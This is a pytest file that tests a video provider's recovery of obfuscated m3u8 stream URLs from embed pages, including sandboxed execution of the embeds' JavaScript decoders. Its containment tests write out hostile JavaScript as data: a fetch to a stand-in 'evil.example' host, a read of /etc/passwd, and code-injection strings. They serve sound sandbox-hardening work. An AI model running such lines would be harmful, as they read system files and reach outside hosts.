from __future__ import annotations

import base64

import pytest
from pytest_httpx import HTTPXMock

from sestudio.providers import jsdecode
from sestudio.providers.base import ProviderError
from sestudio.providers.vidzy import VidzyProvider

requires_js = pytest.mark.skipif(
    not jsdecode.ENGINE_AVAILABLE, reason="no JS engine (quickjs/mini-racer) installed"
)

# The real m3u8 URL we expect the provider to recover from the obfuscated embed.
_EXPECTED = "https://v6.vidzy.cc/hls2/02/00040/abc_n/master.m3u8?t=token&s=1&e=2"
_KEY = [214, 91, 173, 44, 122, 250, 19, 88]


def _encode(url: str, key: list[int]) -> str:
    """Inverse of the embed's decoder: XOR with the rotating key, then base64."""
    xored = bytes(ord(c) ^ key[i % len(key)] for i, c in enumerate(url))
    return base64.b64encode(xored).decode()


def _packed_embed(payload_b64: str, key: list[int]) -> str:
    """A minimal page whose (unpacked) script carries the obfuscated src.

    _unpack short-circuits: if the packed-script regex doesn't match it raises,
    so we ship the decoder inline in a script the provider reads after unpacking.
    Here we sidestep packing by embedding the eval(function(p,a,c,k...)) marker
    with the payload already 'unpacked' — the unpacker returns the group verbatim
    when there is a single literal segment.
    """
    key_csv = ",".join(str(k) for k in key)
    src = (
        f'sources:[{{src:(function(s){{var k=[{key_csv}],b=atob(s),r="";'
        f"for(var i=0;i<b.length;i++){{r+=String.fromCharCode(b.charCodeAt(i)^k[i%8])}}"
        f'return r}})("{payload_b64}"),type:"application/x-mpegURL"}}]'
    )
    # A decoy plain m3u8 that must NOT be picked over the real (obfuscated) one.
    decoy = 'var _fsvHls="https://s1.fsvid.lol/troll/master.m3u8";'
    packed = f"<script>eval(function(p,a,c,k,e,d){{}}('{decoy}{src}',10,10,''.split('|')))</script>"
    return packed


def test_vidzy_decodes_obfuscated_source(httpx_mock: HTTPXMock):
    payload = _encode(_EXPECTED, _KEY)
    httpx_mock.add_response(
        url="https://vidzy.live/embed-abc.html",
        method="GET",
        text=_packed_embed(payload, _KEY),
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-abc.html")
    assert src.url == _EXPECTED
    assert src.provider == "vidzy"


# The other derivation in the wild: the key is an arithmetic ramp rather than a
# literal array, and the decoded string is reversed before being returned.
_SEED, _STEP = 0x5B, 37


def _encode_ramp(url: str, seed: int, step: int) -> str:
    """Inverse of the ramp decoder: reverse, XOR with the ramp, then base64."""
    reversed_url = url[::-1]
    xored = bytes(
        ord(c) ^ ((seed + i * step) & 255) for i, c in enumerate(reversed_url)
    )
    return base64.b64encode(xored).decode()


def _packed_ramp_embed(payload_b64: str, seed: int, step: int) -> str:
    src = (
        f'sources:[{{src:(function(s){{var b=atob(s),r="";'
        f"for(var i=0;i<b.length;i++){{var kk=({hex(seed)}+i*{step})&255;"
        f"r+=String.fromCharCode(b.charCodeAt(i)^kk)}}"
        f'return r.split("").reverse().join("")}})("{payload_b64}"),'
        f'type:"application/x-mpegURL"}}]'
    )
    decoy = 'var _fsvHls="https://s1.fsvid.lol/troll/master.m3u8";'
    return f"<script>eval(function(p,a,c,k,e,d){{}}('{decoy}{src}',10,10,''.split('|')))</script>"


def test_vidzy_decodes_ramp_obfuscated_source(httpx_mock: HTTPXMock):
    payload = _encode_ramp(_EXPECTED, _SEED, _STEP)
    httpx_mock.add_response(
        url="https://vidzy.live/embed-ramp.html",
        method="GET",
        text=_packed_ramp_embed(payload, _SEED, _STEP),
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-ramp.html")
    assert src.url == _EXPECTED
    assert src.provider == "vidzy"


# A third derivation: the same ramp key, but the base64 bytes are reversed
# *before* the XOR rather than the decoded string after it. Because the ramp key
# depends on the byte index, these are not equivalent.
def _encode_pre_reverse(url: str, seed: int, step: int) -> str:
    """Inverse of the pre-reversal decoder: XOR with the ramp, reverse, base64."""
    xored = bytes(ord(c) ^ ((seed + i * step) & 255) for i, c in enumerate(url))
    return base64.b64encode(xored[::-1]).decode()


def _packed_pre_reverse_embed(payload_b64: str, seed: int, step: int) -> str:
    src = (
        f"sources:[{{src:(function(s){{var b=atob(s),"
        f'a=b.split("").reverse().join(""),r="";'
        f"for(var i=0;i<a.length;i++){{var kk=({hex(seed)}+i*{step})&255;"
        f"r+=String.fromCharCode(a.charCodeAt(i)^kk)}}"
        f'return r}})("{payload_b64}"),type:"application/x-mpegURL"}}]'
    )
    decoy = 'var _fsvHls="https://s1.fsvid.lol/troll/master.m3u8";'
    return f"<script>eval(function(p,a,c,k,e,d){{}}('{decoy}{src}',10,10,''.split('|')))</script>"


def test_vidzy_decodes_pre_reversal_obfuscated_source(httpx_mock: HTTPXMock):
    """Reversal applied before the XOR decodes as well as reversal after it."""
    payload = _encode_pre_reverse(_EXPECTED, 0x3D, 89)
    httpx_mock.add_response(
        url="https://vidzy.live/embed-pre.html",
        method="GET",
        text=_packed_pre_reverse_embed(payload, 0x3D, 89),
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-pre.html")
    assert src.url == _EXPECTED
    assert src.provider == "vidzy"


def test_vidzy_tries_both_orientations(httpx_mock: HTTPXMock):
    """A reversed payload resolves even when the body has no .reverse() marker.

    Orientation is discovered by trying both, not by sniffing the body, so a
    rotation that drops or renames the reversal step still decodes.
    """
    page = _packed_ramp_embed(
        _encode_ramp(_EXPECTED, _SEED, _STEP), _SEED, _STEP
    ).replace('.split("").reverse().join("")', "")
    httpx_mock.add_response(
        url="https://vidzy.live/embed-noflag.html", method="GET", text=page
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-noflag.html")
    assert src.url == _EXPECTED


def test_vidzy_falls_through_wrong_scheme_to_right_one(httpx_mock: HTTPXMock):
    """A body carrying both derivations resolves via whichever actually works.

    The decoy array key matches first; only the ramp decodes to a real URL, so
    the array must not be allowed to claim the payload and fail the whole embed.
    """
    page = _packed_ramp_embed(
        _encode_ramp(_EXPECTED, _SEED, _STEP), _SEED, _STEP
    ).replace("var b=atob(s)", "var k=[9,9,9,9],b=atob(s)")
    httpx_mock.add_response(
        url="https://vidzy.live/embed-both.html", method="GET", text=page
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-both.html")
    assert src.url == _EXPECTED


def test_vidzy_reports_unknown_scheme(httpx_mock: HTTPXMock, monkeypatch):
    """An unrecognised derivation fails loudly rather than returning garbage.

    The JS engine is disabled here: with it enabled the embed would simply decode
    (that is the point of it), so this pins the *fallback's* failure behaviour.
    """
    monkeypatch.setattr(jsdecode, "run_inline_decoder", lambda body, payload: None)
    page = _packed_ramp_embed(
        _encode_ramp(_EXPECTED, _SEED, _STEP), _SEED, _STEP
    ).replace(f"({hex(_SEED)}+i*{_STEP})&255", "fresh_scheme(i)")
    httpx_mock.add_response(
        url="https://vidzy.live/embed-new.html", method="GET", text=page
    )
    with pytest.raises(ProviderError, match="rotated to a new one"):
        VidzyProvider().get_stream_url("https://vidzy.live/embed-new.html")


# --- Executing the embed's own decoder (jsdecode) ---------------------------
#
# The tests above pin the pattern-matching fallback. These pin the property that
# motivates the JS engine: a derivation nobody has modelled still resolves.


def _encode_quadratic(url: str) -> str:
    """Inverse of a key that is quadratic in i — no known Python scheme matches."""
    xored = bytes(ord(c) ^ ((i * i + 7) & 255) for i, c in enumerate(url))
    return base64.b64encode(xored).decode()


def _packed_quadratic_embed(payload_b64: str) -> str:
    src = (
        f'sources:[{{src:(function(s){{var b=atob(s),r="";'
        f"for(var i=0;i<b.length;i++){{var kk=(i*i+7)&255;"
        f"r+=String.fromCharCode(b.charCodeAt(i)^kk)}}"
        f'return r}})("{payload_b64}"),type:"application/x-mpegURL"}}]'
    )
    decoy = 'var _fsvHls="https://s1.fsvid.lol/troll/master.m3u8";'
    return f"<script>eval(function(p,a,c,k,e,d){{}}('{decoy}{src}',10,10,''.split('|')))</script>"


@requires_js
def test_vidzy_executes_decoder_for_unmodelled_scheme(httpx_mock: HTTPXMock):
    """A quadratic key decodes even though no Python keystream describes it."""
    page = _packed_quadratic_embed(_encode_quadratic(_EXPECTED))
    httpx_mock.add_response(
        url="https://vidzy.live/embed-quad.html", method="GET", text=page
    )
    src = VidzyProvider().get_stream_url("https://vidzy.live/embed-quad.html")
    assert src.url == _EXPECTED


def test_vidzy_unmodelled_scheme_fails_without_js_engine(
    httpx_mock: HTTPXMock, monkeypatch
):
    """Without the engine the same embed fails — proving the JS path did the work."""
    monkeypatch.setattr(jsdecode, "run_inline_decoder", lambda body, payload: None)
    page = _packed_quadratic_embed(_encode_quadratic(_EXPECTED))
    httpx_mock.add_response(
        url="https://vidzy.live/embed-quad2.html", method="GET", text=page
    )
    with pytest.raises(ProviderError, match="rotated to a new one"):
        VidzyProvider().get_stream_url("https://vidzy.live/embed-quad2.html")


@requires_js
def test_jsdecode_runs_known_schemes_too():
    """The engine handles the modelled variants as well, not just exotic ones."""
    body = (
        'var b=atob(s),a=b.split("").reverse().join(""),r="";'
        "for(var i=0;i<a.length;i++){var kk=(0x3d+i*89)&255;"
        "r+=String.fromCharCode(a.charCodeAt(i)^kk)}return r"
    )
    assert jsdecode.run_inline_decoder(
        body, _encode_pre_reverse(_EXPECTED, 0x3D, 89)
    ) == (_EXPECTED)


@requires_js
@pytest.mark.parametrize(
    "hostile_body",
    [
        'return fetch("https://evil.example/x")',  # no network binding
        'return require("fs").readFileSync("/etc/passwd")',  # no module loader
        "while(true){}",  # killed by the wall-clock limit
        "return 42",  # non-string result is rejected, not returned
    ],
)
def test_jsdecode_contains_hostile_bodies(hostile_body: str):
    """A hostile or runaway body yields None rather than escaping or hanging."""
    assert jsdecode.run_inline_decoder(hostile_body, "aGVsbG8=") is None


@requires_js
def test_jsdecode_payload_cannot_inject_code():
    """The payload is bound, not interpolated, so quotes cannot break out."""
    injected = '");globalThis.pwned=1;("'
    assert jsdecode.run_inline_decoder("return s", injected) == injected


# --- Both engines --------------------------------------------------------- #
# MiniRacer is the shipped engine, but jsdecode.py still prefers QuickJS when it
# is importable, so whichever one a machine happens to have would otherwise be
# the only one tested. These force each in turn. The injection case matters most:
# QuickJS binds the payload, while MiniRacer has to interpolate it as a JSON
# literal. QuickJS is a dev-only dependency limited to the platforms with a
# wheel, so its half skips elsewhere rather than failing.


@pytest.fixture(params=[("quickjs", "MiniRacer"), ("MiniRacer", "quickjs")])
def engine(request, monkeypatch):
    """Force one specific engine, skipping if it is not installed here."""
    wanted, other = request.param
    if getattr(jsdecode, wanted) is None:
        pytest.skip(f"{wanted} not installed")
    monkeypatch.setattr(jsdecode, other, None)
    monkeypatch.setattr(jsdecode, "ENGINE_NAME", wanted)
    return wanted


def test_either_engine_decodes_a_known_scheme(engine):
    body = (
        'var b=atob(s),a=b.split("").reverse().join(""),r="";'
        "for(var i=0;i<a.length;i++){var kk=(0x3d+i*89)&255;"
        "r+=String.fromCharCode(a.charCodeAt(i)^kk)}return r"
    )
    payload = _encode_pre_reverse(_EXPECTED, 0x3D, 89)
    assert jsdecode.run_inline_decoder(body, payload) == _EXPECTED


@pytest.mark.parametrize(
    "hostile_body",
    [
        'return fetch("https://evil.example/x")',
        'return require("fs").readFileSync("/etc/passwd")',
        "while(true){}",
        "return 42",
    ],
)
def test_either_engine_contains_hostile_bodies(engine, hostile_body: str):
    assert jsdecode.run_inline_decoder(hostile_body, "aGVsbG8=") is None


@pytest.mark.parametrize(
    "injected",
    [
        '");globalThis.pwned=1;("',
        '\\");globalThis.pwned=1;("',  # an escaped quote must stay escaped
        "'+globalThis.pwned+'",
        # Legal inside a JSON string, but line terminators in JavaScript —
        # the reason json.dumps must keep its default ensure_ascii.
        "line\u2028separator",
        "para\u2029graph",
        "new\nline",
        'back\\slash"quote',
    ],
)
def test_either_engine_returns_the_payload_verbatim(engine, injected: str):
    """Nothing in the payload can escape into the surrounding source."""
    assert jsdecode.run_inline_decoder("return s", injected) == injected
